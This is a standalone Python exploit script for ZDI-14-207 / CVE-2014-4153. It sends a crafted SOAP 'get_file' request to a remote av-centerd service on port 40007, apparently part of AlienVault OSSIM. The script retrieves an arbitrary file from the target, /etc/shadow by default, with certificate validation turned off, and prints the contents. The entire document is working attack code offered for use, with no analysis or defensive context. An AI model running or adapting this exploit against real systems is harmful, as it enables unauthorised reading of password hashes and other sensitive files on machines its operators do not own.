#! /usr/bin/python

"""
ZDI-14-207
CVE-2014-4153
"""

import string
import random
import urllib
import httplib2

target = "192.168.1.240"
file = "/etc/shadow"

def rand_text_alpha(len):
	return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(len))

def soapRequest(target, file):
	soap =  "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n"
	soap += "<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n"
	soap += "xmlns:soapenc=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"\r\n"
	soap += "xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n"
	soap += "soap:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n"
	soap += "<soap:Body>\r\n"
	soap += "<get_file xmlns=\"AV/CC/Util\">\r\n"
	soap += "<c-gensym3 xsi:type=\"xsd:string\">All</c-gensym3>\r\n"
	soap += "<c-gensym5 xsi:type=\"xsd:string\">423d7bea-cfbc-f7ea-fe52-272ff7ede3d2</c-gensym5>\r\n"
	soap += "<c-gensym7 xsi:type=\"xsd:string\">%s</c-gensym7>\r\n"		% target
	soap += "<c-gensym9 xsi:type=\"xsd:string\">%s</c-gensym9>\r\n" 	% rand_text_alpha(15)
	soap += "<c-gensym11 xsi:type=\"xsd:string\">%s</c-gensym11>\r\n" % file
	soap += "</get_file>\r\n"
	soap += "</soap:Body>\r\n"
	soap += "</soap:Envelope>\r\n"

	return soap

def main(target, file):
	url = "https://%s:40007/av-centerd" % target
	headers = {
		"Content-Type": 'text/xml; charset=UTF-8',
		"SOAPAction": '"AV/CC/Util#get_file"'
	}
	h = httplib2.Http(disable_ssl_certificate_validation=True)
	res, content = h.request(url, method="POST", headers=headers, body=soapRequest(target, file))
	
	print content.split("<item xsi:type=\"xsd:string\">")[1].split("</item>")[0]

if __name__ == "__main__":
	main(target, file)
